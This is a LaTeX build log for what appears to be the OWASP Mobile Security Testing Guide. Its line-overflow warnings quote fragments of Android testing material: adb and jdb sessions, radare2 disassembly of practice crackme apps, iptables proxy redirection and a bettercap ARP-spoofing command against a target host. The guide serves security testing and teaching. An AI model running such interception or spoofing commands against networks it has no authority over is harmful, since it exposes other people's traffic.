[187] [188]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/3933903697e015a01f618c96228f42937b14019b.
png" > [189]
Overfull \hbox (34.2294pt too wide) in paragraph at lines 11037--11037
[]\TU/SourceCodePro(6)/m/n/10.95 Successfully downloaded ... to sg.vp.owasp_mob
ile.omtg_android_preferences.xml[] 
[190]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/c2929f644815f079c32d8d19c05474b920ef29ab.
png" > [191] [192] [193] [194] [195] [196]
Underfull \hbox (badness 3128) in paragraph at lines 11415--11419
[]\TU/SourceSansPro(0)/m/n/10.95 Here’s a non-exhaustive list of some info and 
the corresponding keywords that you can easily
[197]
Overfull \hbox (176.57875pt too wide) in paragraph at lines 11524--11524
[]\TU/SourceCodePro(6)/m/n/10.95 ----------------------  ----------------------
-----------------------------------------------------[] 

Overfull \hbox (36.41943pt too wide) in paragraph at lines 11524--11524
[]\TU/SourceCodePro(6)/m/n/10.95 codeCacheDirectory      /data/user/0/sg.vp.owa
sp_mobile.omtg_android/code_cache[] 

Overfull \hbox (143.72934pt too wide) in paragraph at lines 11524--11524
[]\TU/SourceCodePro(6)/m/n/10.95 externalCacheDirectory  /storage/emulated/0/An
droid/data/sg.vp.owasp_mobile.omtg_android/cache[] 

Overfull \hbox (62.69946pt too wide) in paragraph at lines 11524--11524
[]\TU/SourceCodePro(6)/m/n/10.95 obbDir                  /storage/emulated/0/An
droid/obb/sg.vp.owasp_mobile.omtg_android[] 

Overfull \hbox (161.2494pt too wide) in paragraph at lines 11524--11524
[]\TU/SourceCodePro(6)/m/n/10.95 packageCodePath         /data/app/sg.vp.owasp_
mobile.omtg_android-kR0ovWl9eoU_yh0jPJ9caQ==/base.apk[] 
[198]
Overfull \hbox (2.69832pt too wide) in paragraph at lines 11531--11535
[]\TU/SourceSansPro(0)/m/n/10.95 The internal data directory (aka. sandbox dire
ctory) which is at \TU/SourceCodePro(6)/m/n/10.95 /data/data/[package-name]
[199]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/f313f719cdfa7959e664fd2e21f53a9fcf7d6866.
png" >
Overfull \hbox (12.3294pt too wide) in paragraph at lines 11651--11651
[]\TU/SourceCodePro(6)/m/n/10.95 $ adb logcat | grep "$(adb shell ps | grep <pa
ckage-name> | awk []{print $2}[])"[] 
[200]
Underfull \hbox (badness 1688) in paragraph at lines 11689--11691
[]\TU/SourceSansPro(0)/m/n/10.95 In certain production builds, you might encoun
ter an error \TU/SourceCodePro(6)/m/n/10.95 mount: []/system[] not in

Overfull \hbox (14.51942pt too wide) in paragraph at lines 11715--11715
[]\TU/SourceCodePro(6)/m/n/10.95 04:54:06.590751 00:9e:1e:10:7f:69 (oui Unknown
) > Broadcast, RRCP-0x23 reply[] 

Overfull \hbox (14.51942pt too wide) in paragraph at lines 11715--11715
[]\TU/SourceCodePro(6)/m/n/10.95 04:54:09.659658 00:9e:1e:10:7f:69 (oui Unknown
) > Broadcast, RRCP-0x23 reply[] 

Overfull \hbox (14.51942pt too wide) in paragraph at lines 11715--11715
[]\TU/SourceCodePro(6)/m/n/10.95 04:54:10.579795 00:9e:1e:10:7f:69 (oui Unknown
) > Broadcast, RRCP-0x23 reply[] 
[201]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/d900623abe71b16708fe18ac2b6f64bad8a52940.
png" > [202]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/7f691aaaf6ec47de147328a7a97e7bc6d8783ba2.
png" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/16c05811ca4e956a31e4a7bb5b376b9395fa16e7.
png" > [203] [204]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/2e818595a18a1cfbf5f33ff73d6c378862712b89.
png" > [205]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/9cdb0f9a684dd8350455778005a9452a8ce54d1f.
png" > [206]
Overfull \hbox (7.0698pt too wide) in paragraph at lines 12016--12027
[]\TU/SourceSansPro(0)/m/n/10.95 Some application (e.g. the [][]Chrome browser[
][]) may show \TU/SourceCodePro(6)/m/n/10.95 NET::ERR_CERT_VALIDITY_TOO_LONG
[207] [208] [209] [210] [211] [212]
Overfull \hbox (8.78668pt too wide) in paragraph at lines 12368--12370
[]\TU/SourceSansPro(0)/m/n/10.95 For both solutions you need to activate “Suppo
rt invisible proxying” in Burp, in Proxy Tab/Options/Edit

Overfull \hbox (99.9294pt too wide) in paragraph at lines 12380--12380
[]\TU/SourceCodePro(6)/m/n/10.95 $ iptables -t nat -A OUTPUT -p tcp --dport 80 
-j DNAT --to-destination <Your-Proxy-IP>:8080[] 

Overfull \hbox (88.97955pt too wide) in paragraph at lines 12404--12404
[]\TU/SourceCodePro(6)/m/n/10.95 DNAT       tcp  --  anywhere             anywh
ere             tcp dpt:5288 to:<Your-Proxy-IP>:8080[] 
[213]
Overfull \hbox (347.39938pt too wide) in paragraph at lines 12430--12430
[]\TU/SourceCodePro(6)/m/n/10.95 $ sudo bettercap -eval "set arp.spoof.targets 
X.X.X.X; arp.spoof on; set arp.spoof.internal true; set arp.spoof.fullduplex tr
ue;"[] 

Overfull \hbox (97.73944pt too wide) in paragraph at lines 12430--12430
[]\TU/SourceCodePro(6)/m/n/10.95 bettercap v2.22 (built for darwin amd64 with g
o1.12.1) [type []help[] for a list of commands][] 

Overfull \hbox (10.13943pt too wide) in paragraph at lines 12430--12430
[]\TU/SourceCodePro(6)/m/n/10.95 [19:21:39] [sys.log] [inf] arp.spoof arp spoof
er started, probing 1 targets.[] 
[214]
Underfull \hbox (badness 10000) in paragraph at lines 12495--12498
[]\TU/SourceSansPro(0)/m/n/10.95 Basic Network Security Configuration - [][]$[]
[][][][] [] [] [] [][][][][][][][] [] [][][][][][][][][][] [] [][][][][][] [] [
][][] [] [][][][][][][][] []

Underfull \hbox (badness 10000) in paragraph at lines 12498--12502
[][][] [] [][][][] [] [][][][] [] [][] [] [][] [] [] [][] [][][][][][][][] [][]
 [][][][][][][][] [][] [][][][][] [][] [][] [][] [][][][][][][] [][] [][][][][]
[][][] [][] [][][][][][][][][][][][][] [][] [][] [][] [][][][][][][] [][]

Underfull \hbox (badness 4543) in paragraph at lines 12526--12529
[]\TU/SourceSansPro(0)/m/n/10.95 SharedPreferences APIs - [][]$[][][][][] [] []
 [] [][][][][][][][][] [] [][][][][][][] [] [][][] [] [][][][][][][][] [] [][][
][][][] [] [][][][] [][] [][][][][][][] [] [][][][][][] [][]
[215]
Underfull \hbox (badness 4217) in paragraph at lines 12552--12555
[]\TU/SourceSansPro(0)/m/n/10.95 Android NDK Downloads - [][]$[][][][][] [] [] 
[] [][][][][][][][][] [] [][][][][][][] [] [][][] [] [][][] [] [][][][][][][][]
[] [] [][][][][] [] [][][][] [] [][][][][][] [][]
[216] [217]
Underfull \hbox (badness 1968) in paragraph at lines 12721--12733
\TU/SourceSansPro(0)/m/n/10.95 readable. Fortunately, Java decompilers generall
y handle Android bytecode well. Popular free
[218] [219]
Overfull \hbox (196.28934pt too wide) in paragraph at lines 12839--12839
[]\TU/SourceCodePro(6)/m/n/10.95 $ wget https://github.com/OWASP/owasp-mstg/raw
/master/Crackmes/Android/Level_01/UnCrackable-Level1.apk[] 

<use  "/tmp/tex2pdf.-b81d3c9506d190f0/b7218223963e160bb23b8740d81da1ec9ba40306.
png" > [220] [221]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/6dcc613ab62a7f54560f516bce94dc562a5ec576.
jpg" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/576f6aa1d427f2ec67695539e120520535f6d392.
jpg" > [222]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/8ff26bdbf1d75df81f76e8179d0c8eaa03841b67.
jpg" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/479365e620ef5d468ce30bee9120b9223109e90f.
jpg" > [223] [224]
Overfull \hbox (215.99933pt too wide) in paragraph at lines 13011--13011
[]\TU/SourceCodePro(6)/m/n/10.95 $ wget https://github.com/OWASP/owasp-mstg/raw
/master/Samples/Android/01_HelloWorld-JNI/HelloWord-JNI.apk[] 

<use  "/tmp/tex2pdf.-b81d3c9506d190f0/8e08bca1d4ad633b71205ea22c4c17cafa6cd2bb.
png" > [225]
Overfull \hbox (69.5245pt too wide) in paragraph at lines 13054--13054
\TU/SourceCodePro(6)/m/n/10 ((TextView)[]\TU/SourceCodePro(6)/bx/n/10 this[]\TU
/SourceCodePro(6)/m/n/10 .[]findViewById[]([]2131427422[])).[]setText[]((CharSe
quence)[]\TU/SourceCodePro(6)/bx/n/10 this[]\TU/SourceCodePro(6)/m/n/10 .[]stri
ngFromJNI[]());|  

<use  "/tmp/tex2pdf.-b81d3c9506d190f0/9fc57a40d76503de64f69b4bd6de61b4ccf8932f.
jpg" > [226]
Overfull \hbox (205.04945pt too wide) in paragraph at lines 13103--13103
[]     \TU/SourceCodePro(6)/m/n/10.95 3: 00004e49   112 FUNC    GLOBAL DEFAULT 
  11 Java_sg_vantagepoint_helloworld_MainActivity_stringFromJNI[] 

Overfull \hbox (205.04936pt too wide) in paragraph at lines 13110--13110
[]\TU/SourceCodePro(6)/m/n/10.95 003 0x00000e78 0x00000e78 GLOBAL   FUNC   16 J
ava_sg_vantagepoint_helloworldjni_MainActivity_stringFromJNI[] 
[227]
Overfull \hbox (76.03288pt too wide) in paragraph at lines 13153--13159
[]\TU/SourceSansPro(0)/m/n/10.95 To open the file in radare2 you only have to r
un \TU/SourceCodePro(6)/m/n/10.95 r2 -A HelloWord-JNI/lib/armeabi-v7a/libnative
-lib.so\TU/SourceSansPro(0)/m/n/10.95 .
[228] [229]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/8f8c639e93e6960d7f50c243f52229fc18cdcde3.
jpg" > [230]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/8de449706bf63265be48bd835aa227612a1e921f.
png" > [231]
Underfull \hbox (badness 2884) in paragraph at lines 13348--13357
\TU/SourceSansPro(0)/m/n/10.95 such as Ghidra or Cutter or rely on CLI-based to
ols such as the \TU/SourceSansPro(0)/m/it/10.95 strings \TU/SourceSansPro(0)/m/
n/10.95 Unix utility (\TU/SourceCodePro(6)/m/n/10.95 strings
[232] [233]
Overfull \hbox (38.26028pt too wide) in paragraph at lines 13474--13482
\TU/SourceSansPro(0)/m/n/10.95 along is a good practice. Open the \TU/SourceCod
ePro(6)/m/n/10.95 MainActivity \TU/SourceSansPro(0)/m/n/10.95 class in the pack
age \TU/SourceCodePro(6)/m/n/10.95 sg.vantagepoint.uncrackable1\TU/SourceSansPr
o(0)/m/n/10.95 .

<use  "/tmp/tex2pdf.-b81d3c9506d190f0/89f4493dc543c8aac3d5832072600f0f501870e7.
jpg" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/ceae72251f9dfa7c124c9f3ddaaf620a54091696.
jpg" > [234]
Overfull \hbox (15.5245pt too wide) in paragraph at lines 13515--13515
\TU/SourceCodePro(6)/m/n/10 Base64.[]decode[]((String)[]"5UJiFctbmgbDoLXmpL12mk
no8HT4Lv8dlat8FxR2GOc="[], 

Overfull \hbox (29.02097pt too wide) in paragraph at lines 13532--13538
[]\TU/SourceSansPro(0)/m/n/10.95 So, you have a Base64-encoded String that’s pa
ssed to the function \TU/SourceCodePro(6)/m/n/10.95 a \TU/SourceSansPro(0)/m/n/
10.95 in the package \TU/SourceCodePro(6)/m/n/10.95 sg.vantagepoint.a.a
[235]
Overfull \hbox (205.04936pt too wide) in paragraph at lines 13583--13583
[]\TU/SourceCodePro(6)/m/n/10.95 003 0x00000e78 0x00000e78 GLOBAL   FUNC   16 J
ava_sg_vantagepoint_helloworldjni_MainActivity_stringFromJNI[] 

Overfull \hbox (23.27937pt too wide) in paragraph at lines 13604--13604
[]\TU/SourceCodePro(6)/m/n/10.95 ╭ (fcn) sym.Java_sg_vantagepoint_helloworldjni
_MainActivity_stringFromJNI 12[] 

Overfull \hbox (78.02936pt too wide) in paragraph at lines 13604--13604
[]\TU/SourceCodePro(6)/m/n/10.95 │   sym.Java_sg_vantagepoint_helloworldjni_Mai
nActivity_stringFromJNI (int32_t arg1);[] 

Overfull \hbox (124.01958pt too wide) in paragraph at lines 13604--13604
[]\TU/SourceCodePro(6)/m/n/10.95 │           0x00000e7a      0249           ldr
 r1, aav.0x00000f3c      ; [0xe84:4]=0xf3c aav.0x00000f3c[] 

Overfull \hbox (106.49966pt too wide) in paragraph at lines 13604--13604
[]\TU/SourceCodePro(6)/m/n/10.95 │           0x00000e80      7944           add
 r1, pc                  ; "Hello from C++" section..rodata[] 
[236]
Overfull \hbox (134.96938pt too wide) in paragraph at lines 13637--13637
[]\TU/SourceCodePro(6)/m/n/10.95 $ r2 -qc []e emu.str=true; s 0x00000e78; af; p
df[] HelloWord-JNI/lib/armeabi-v7a/libnative-lib.so[] 

Overfull \hbox (23.27937pt too wide) in paragraph at lines 13637--13637
[]\TU/SourceCodePro(6)/m/n/10.95 ╭ (fcn) sym.Java_sg_vantagepoint_helloworldjni
_MainActivity_stringFromJNI 12[] 

Overfull \hbox (78.02936pt too wide) in paragraph at lines 13637--13637
[]\TU/SourceCodePro(6)/m/n/10.95 │   sym.Java_sg_vantagepoint_helloworldjni_Mai
nActivity_stringFromJNI (int32_t arg1);[] 

Overfull \hbox (23.2796pt too wide) in paragraph at lines 13637--13637
[]\TU/SourceCodePro(6)/m/n/10.95 │           0x00000e7a      0249           ldr
 r1, [0x00000e84]        ; [0xe84:4]=0xf3c[] 

Overfull \hbox (106.49966pt too wide) in paragraph at lines 13637--13637
[]\TU/SourceCodePro(6)/m/n/10.95 │           0x00000e80      7944           add
 r1, pc                  ; "Hello from C++" section..rodata[] 

Overfull \hbox (174.74588pt too wide) in paragraph at lines 13652--13661
\TU/SourceSansPro(0)/m/n/10.95 dialog. Enter “java” and hit enter. This should 
highlight the \TU/SourceCodePro(6)/m/n/10.95 Java_sg_vantagepoint_helloworld_Ma
inActivity_stringFromJNI

<use  "/tmp/tex2pdf.-b81d3c9506d190f0/863e10b9775e05477765e9cefdc94ea46693a266.
jpg" > [237]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/c96d983d30cbabc7d3d5c2c7951de81c61d650c5.
png" > [238]
Overfull \hbox (190.5771pt too wide) in paragraph at lines 13740--13751
\TU/SourceSansPro(0)/m/n/10.95 fined functions: \TU/SourceCodePro(6)/m/n/10.95 
FUN_001004d0\TU/SourceSansPro(0)/m/n/10.95 , \TU/SourceCodePro(6)/m/n/10.95 FUN
_0010051c\TU/SourceSansPro(0)/m/n/10.95 , and \TU/SourceCodePro(6)/m/n/10.95 Ja
va_sg_vantagepoint_helloworldjni_MainActivity_stringFromJNI\TU/SourceSansPro(0)
/m/n/10.95 .

Overfull \hbox (71.98134pt too wide) in paragraph at lines 13740--13751
\TU/SourceSansPro(0)/m/n/10.95 The instructions in the function \TU/SourceCodeP
ro(6)/m/n/10.95 Java_sg_vantagepoint_helloworldjni_MainActivity_stringFromJNI

<use  "/tmp/tex2pdf.-b81d3c9506d190f0/a910215ed46dba7e8f1cef010443d3ffce923f4a.
png" > [239] [240] [241]
Overfull \hbox (139.3496pt too wide) in paragraph at lines 13921--13921
[]\TU/SourceCodePro(6)/m/n/10.95 .foobar.c  6233     u0_a97  txt       REG     
        259,11     23968        399 /system/bin/app_process64[] 

Overfull \hbox (299.21967pt too wide) in paragraph at lines 13921--13921
[]\TU/SourceCodePro(6)/m/n/10.95 .foobar.c  6233     u0_a97  mem   unknown     
                                    /dev/ashmem/dalvik-main space (region space
) (deleted)[] 

Overfull \hbox (314.54955pt too wide) in paragraph at lines 13921--13921
[]\TU/SourceCodePro(6)/m/n/10.95 .foobar.c  6233     u0_a97  mem       REG     
         253,0   2797568    1146914 /data/dalvik-cache/arm64/system@framework@b
oot.art[] 

Overfull \hbox (393.38951pt too wide) in paragraph at lines 13921--13921
[]\TU/SourceCodePro(6)/m/n/10.95 .foobar.c  6233     u0_a97  mem       REG     
         253,0   1081344    1146915 /data/dalvik-cache/arm64/system@framework@b
oot-core-libart.art[] 
[242]
Overfull \hbox (30.91528pt too wide) in paragraph at lines 13943--13949
[]\TU/SourceSansPro(0)/m/n/10.95 You can find system-wide networking informatio
n in \TU/SourceCodePro(6)/m/n/10.95 /proc/net \TU/SourceSansPro(0)/m/n/10.95 or
 just by inspecting the \TU/SourceCodePro(6)/m/n/10.95 /proc/<pid>/net

Overfull \hbox (110.87944pt too wide) in paragraph at lines 13958--13958
[]\TU/SourceCodePro(6)/m/n/10.95 sl  local_address rem_address   st tx_queue rx
_queue tr tm->when retrnsmt   uid  timeout inode[] 

Overfull \hbox (314.54942pt too wide) in paragraph at lines 13958--13958
[]\TU/SourceCodePro(6)/m/n/10.95 69: 1101A8C0:BB2F 9A447D4A:01BB 01 00000000:00
000000 00:00000000 00000000 10093        0 75412 1 0000000000000000 20 3 19 10 
-1[] 

Overfull \hbox (314.54942pt too wide) in paragraph at lines 13958--13958
[]\TU/SourceCodePro(6)/m/n/10.95 70: 1101A8C0:917C E3CB3AD8:01BB 01 00000000:00
000000 00:00000000 00000000 10093        0 75553 1 0000000000000000 20 3 23 10 
-1[] 

Overfull \hbox (314.54942pt too wide) in paragraph at lines 13958--13958
[]\TU/SourceCodePro(6)/m/n/10.95 71: 1101A8C0:C1E3 9C187D4A:01BB 01 00000000:00
000000 00:00000000 00000000 10093        0 75458 1 0000000000000000 20 3 19 10 
-1[] 

Overfull \hbox (88.97958pt too wide) in paragraph at lines 13991--13991
[]\TU/SourceCodePro(6)/m/n/10.95 Proto Recv-Q Send-Q Local Address           Fo
reign Address         State       PID/Program Name[] 

Overfull \hbox (209.42949pt too wide) in paragraph at lines 13991--13991
[]\TU/SourceCodePro(6)/m/n/10.95 tcp        0      0 192.168.1.17:47368      17
2.217.194.103:https   CLOSE_WAIT  24685/com.google.android.youtube[] 

Overfull \hbox (207.23949pt too wide) in paragraph at lines 13991--13991
[]\TU/SourceCodePro(6)/m/n/10.95 tcp        0      0 192.168.1.17:47233      17
2.217.194.94:https    CLOSE_WAIT  24685/com.google.android.youtube[] 

Overfull \hbox (215.99947pt too wide) in paragraph at lines 13991--13991
[]\TU/SourceCodePro(6)/m/n/10.95 tcp        0      0 192.168.1.17:38480      sc
-in-f100.1e100.:https ESTABLISHED 24685/com.google.android.youtube[] 

Overfull \hbox (205.0495pt too wide) in paragraph at lines 13991--13991
[]\TU/SourceCodePro(6)/m/n/10.95 tcp        0      0 192.168.1.17:44833      74
.125.24.91:https      ESTABLISHED 24685/com.google.android.youtube[] 

Overfull \hbox (215.99947pt too wide) in paragraph at lines 13991--13991
[]\TU/SourceCodePro(6)/m/n/10.95 tcp        0      0 192.168.1.17:38481      sc
-in-f100.1e100.:https ESTABLISHED 24685/com.google.android.youtube[] 
[243]
Overfull \hbox (281.69955pt too wide) in paragraph at lines 14028--14028
[]\TU/SourceCodePro(6)/m/n/10.95 12c00000-52c00000 rw-p 00000000 00:04 14917   
                           /dev/ashmem/dalvik-main space (region space) (delete
d)[] 

Overfull \hbox (268.55952pt too wide) in paragraph at lines 14028--14028
[]\TU/SourceCodePro(6)/m/n/10.95 6f019000-6f2c0000 rw-p 00000000 fd:00 1146914 
                           /data/dalvik-cache/arm64/system@framework@boot.art[]
 

Overfull \hbox (454.70943pt too wide) in paragraph at lines 14028--14028
[]\TU/SourceCodePro(6)/m/n/10.95 7327670000-7329747000 r--p 00000000 fd:00 1884
627                        /data/app/com.google.android.gms-4FJbDh-oZv-5bCw39jk
IMQ==/oat/arm64/base.odex[] 

Overfull \hbox (579.53937pt too wide) in paragraph at lines 14028--14028
[]\TU/SourceCodePro(6)/m/n/10.95 733494d000-7334cfb000 r-xp 00000000 fd:00 1884
542                        /data/app/com.google.android.youtube-Rl_hl9LptFQf3Vf
-JJReGw==/lib/arm64/libcronet.80.0.3970.3.so[] 

Overfull \hbox (13.20181pt too wide) in paragraph at lines 14033--14038
[]\TU/SourceSansPro(0)/m/n/10.95 The application data is stored in a sandboxed 
directory present at \TU/SourceCodePro(6)/m/n/10.95 /data/data/<app_package_nam
e>\TU/SourceSansPro(0)/m/n/10.95 .
[244] [245]
Overfull \hbox (24.42918pt too wide) in paragraph at lines 14141--14149
[]\TU/SourceSansPro(0)/m/n/10.95 Review the code and you’ll see that the method
 \TU/SourceCodePro(6)/m/n/10.95 sg.vantagepoint.uncrackable1.MainActivity.a
[246]
Overfull \hbox (64.88939pt too wide) in paragraph at lines 14175--14175
[]\TU/SourceCodePro(6)/m/n/10.95 Breakpoint hit: "thread=main", android.app.Dia
log.setCancelable(), line=1,110 bci=0[] 

Overfull \hbox (64.88939pt too wide) in paragraph at lines 14197--14197
[]\TU/SourceCodePro(6)/m/n/10.95 Breakpoint hit: "thread=main", android.app.Dia
log.setCancelable(), line=1,110 bci=0[] 
[247] [248]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/e72654a6a7c90c6599aa37ed6e7a31b0b4a8953c.
png" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/d706835a0a613f7a1c3657d0e4f6cef4a1eb2fd4.
png" > [249]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/06ba7913ac1a2b0a4aa6772f5a46f958090cfcf4.
png" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/88882390b46ffa938d25cc2171b9d17ae601e321.
png" > [250]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/f6aca067d3cb055ccf6710f43ba1803d1c3cb9f6.
png" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/f6aca067d3cb055ccf6710f43ba1803d1c3cb9f6.
png" > [251]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/be767c8387e4fa818e0d2472725ba354bbed9963.
png" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/41267d580ddfdde69914ed30df95961c12bcccd2.
png" > [252]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/2227ece3978c331f17f61ab16971637b28978e2b.
png" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/436e8051f1cc1455cba06b72c3b43af389e741a0.
png" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/355be076b7f1150d56bfc6db6f006e480d86342c.
png" > [253]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/6fb02bb0034224ded58a891172cdf90fac1b99c2.
png" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/e25a98359ba7bd5a62406e7235ab1a6aa4d784e1.
png" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/6b6d5a67bd3b76357dc552be5af26f9719a0a5d2.
png" > [254]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/1335eef4fd499e31b736d73fe8df57f38edc11a2.
png" >
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/d0f6dbdba327db2d0324dd91e49a89bfbca238ff.
png" > [255]
Overfull \hbox (62.69943pt too wide) in paragraph at lines 14488--14488
[]\TU/SourceCodePro(6)/m/n/10.95 u0_a164   12690 201   1533400 51692 ffffffff 0
0000000 S sg.vantagepoint.helloworldjni[] 
[256]
Overfull \hbox (16.70944pt too wide) in paragraph at lines 14510--14510
[]\TU/SourceCodePro(6)/m/n/10.95 Reading symbols from libnative-lib.so...(no de
bugging symbols found)...done.[] 

Overfull \hbox (280.79056pt too wide) in paragraph at lines 14521--14529
[]\TU/SourceSansPro(0)/m/n/10.95 Our objective is to set a breakpoint at the fi
rst instruction of the native function \TU/SourceCodePro(6)/m/n/10.95 Java_sg_v
antagepoint_helloworldjni_MainActivity_stringFromJNI

Underfull \hbox (badness 2245) in paragraph at lines 14541--14548
\TU/SourceSansPro(0)/m/n/10.95 point at the \TU/SourceCodePro(6)/m/n/10.95 java
.lang.System.loadLibrary \TU/SourceSansPro(0)/m/n/10.95 method and resume the p
rocess. After the

Overfull \hbox (25.46939pt too wide) in paragraph at lines 14560--14560
[]\TU/SourceCodePro(6)/m/n/10.95 Breakpoint hit: "thread=main", java.lang.Syste
m.loadLibrary(), line=988 bci=0[] 

Overfull \hbox (170.00935pt too wide) in paragraph at lines 14560--14560
[]\TU/SourceCodePro(6)/m/n/10.95 Step completed: "thread=main", sg.vantagepoint
.helloworldjni.MainActivity.<clinit>(), line=12 bci=5[] 
[257]
Overfull \hbox (10.1394pt too wide) in paragraph at lines 14610--14610
[]\TU/SourceCodePro(6)/m/n/10.95 > stop in com.acme.bob.mobile.android.core.Bob
MobileApplication.<clinit>()[] 

Overfull \hbox (91.16939pt too wide) in paragraph at lines 14610--14610
[]\TU/SourceCodePro(6)/m/n/10.95 Deferring breakpoint com.acme.bob.mobile.andro
id.core.BobMobileApplication.<clinit>().[] 

Overfull \hbox (102.11937pt too wide) in paragraph at lines 14610--14610
[]\TU/SourceCodePro(6)/m/n/10.95 Set deferred breakpoint com.acme.bob.mobile.an
droid.core.BobMobileApplication.<clinit>()[] 
[258]
Overfull \hbox (242.27934pt too wide) in paragraph at lines 14610--14610
[]\TU/SourceCodePro(6)/m/n/10.95 Breakpoint hit: "thread=main", com.acme.bob.mo
bile.android.core.BobMobileApplication.<clinit>(), line=44 bci=0[] 
[259]
Overfull \hbox (393.38942pt too wide) in paragraph at lines 14676--14676
[]\TU/SourceCodePro(6)/m/n/10.95 $ while true; do pid=$(pgrep []target_process[
] | head -1); if [[ -n "$pid" ]]; then strace -s 2000 - e "!read" -ff -p "$pid"
; break; fi; done[] 
[260]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/edb98d4210c76f2964570cb2d22ab456c3330ccb.
png" > [261] [262] [263]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/fb1b26788aead664e5a0f41c958b592f8669d389.
png" > [264]
Overfull \hbox (294.83939pt too wide) in paragraph at lines 14947--14947
[]\TU/SourceCodePro(6)/m/n/10.95 $ emulator -show-kernel -avd Nexus_4_API_19 -s
napshot default-boot -no-snapshot-save -qemu -d in_asm,cpu 2>/tmp/qemu.log[] 
[265] [266]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/43b2caf15e7d55029ae04597beb74c2ca7c74342.
png" >
Underfull \hbox (badness 10000) in paragraph at lines 15093--15095
[][] \TU/SourceSansPro(0)/m/n/10.95 Disassem-
[267]
<use  "/tmp/tex2pdf.-b81d3c9506d190f0/a9a7d2d1f4cd59ad389154d6c3aae7dad92f39e7.
png" > [268]
Underfull \hbox (badness 1715) in paragraph at lines 15109--15117
[]\TU/SourceCodePro(6)/m/n/10.95 strlen \TU/SourceSansPro(0)/m/n/10.95 is calle
d at offset \TU/SourceCodePro(6)/m/n/10.95 0x000018a8\TU/SourceSansPro(0)/m/n/1
0.95 , and the returned value is compared to 0x10 at offset
[269]
Overfull \hbox (18.89967pt too wide) in paragraph at lines 15207--15207
[]\TU/SourceCodePro(6)/m/n/10.95 │           0x0000176c      str r0, [var_20h] 
                         ; 0x20 ; "$!" ; arg1[] 

Overfull \hbox (84.59966pt too wide) in paragraph at lines 15207--15207
[]\TU/SourceCodePro(6)/m/n/10.95 │           0x00001770      ldr r3, [var_20h] 
                         ; 0x20 ; "$!" ; entry.preinit0[] 

Overfull \hbox (47.36964pt too wide) in paragraph at lines 15207--15207
[]\TU/SourceCodePro(6)/m/n/10.95 │      ╎│   0x000017a4      ldr r1, [var_14h] 
                         ; 0x14 ; entry.preinit0[] 

Overfull \hbox (121.82964pt too wide) in paragraph at lines 15207--15207
[]\TU/SourceCodePro(6)/m/n/10.95 │      ╎│   0x000017bc      add r3, r3, 2     
                         ; "ELF\x01\x01\x01" ; aav.0x00000001[] 

Overfull \hbox (47.36964pt too wide) in paragraph at lines 15207--15207
[]\TU/SourceCodePro(6)/m/n/10.95 │      ╎│   0x000017c4      ldr r3, [var_14h] 
                         ; 0x14 ; entry.preinit0[] 

Overfull \hbox (51.74962pt too wide) in paragraph at lines 15207--15207
[]\TU/SourceCodePro(6)/m/n/10.95 │      ╎╰─> 0x000017d0      ldr r3, [var_14h] 
                         ; 0x14 ; entry.preinit0[] 

Overfull \hbox (200.66965pt too wide) in paragraph at lines 15207--15207
[]\TU/SourceCodePro(6)/m/n/10.95 │      ╎    0x000017d4      cmp r3, 4         
                         ; aav.0x00000004 ; aav.0x00000001 ; aav.0x00000001[] 
[270]
Overfull \hbox (222.56955pt too wide) in paragraph at lines 15207--15207
[]\TU/SourceCodePro(6)/m/n/10.95 │   │││││   0x00001840      ldr r3, [0x0000186
c]                       ; [0x186c:4]=0x270 section..hash ; section..hash[] 

Overfull \hbox (255.41959pt too wide) in paragraph at lines 15207--15207
[]\TU/SourceCodePro(6)/m/n/10.95 │   │││││   0x00001844      add r3, pc, r3    
                         ; 0x1abc ; "Product activation passed. Congratulations
!"[] 

Overfull \hbox (259.7996pt too wide) in paragraph at lines 15207--15207
[]\TU/SourceCodePro(6)/m/n/10.95 │   │││││   0x00001848      mov r0, r3        
                         ; 0x1abc ; "Product activation passed. Congratulations
!" ;[] 

Overfull \hbox (62.69963pt too wide) in paragraph at lines 15207--15207
[]\TU/SourceCodePro(6)/m/n/10.95 │   │││││   0x0000184c      bl sym.imp.puts   
                         ; int puts(const char *s)[] 

Overfull \hbox (218.18974pt too wide) in paragraph at lines 15207--15207
[]\TU/SourceCodePro(6)/m/n/10.95 │   │││││                                     
                         ; int puts("Product activation passed. Congratulations
!")[] 

Overfull \hbox (45.17941pt too wide) in paragraph at lines 15207--15207
[]\TU/SourceCodePro(6)/m/n/10.95 │  ││││││   ; CODE XREFS from fcn.00001760 (0x
17ec, 0x1800, 0x1814, 0x1828, 0x183c)[] 

Overfull \hbox (139.34955pt too wide) in paragraph at lines 15207--15207
[]\TU/SourceCodePro(6)/m/n/10.95 │  │╰╰╰╰╰─> 0x00001854      ldr r3, aav.0x0000
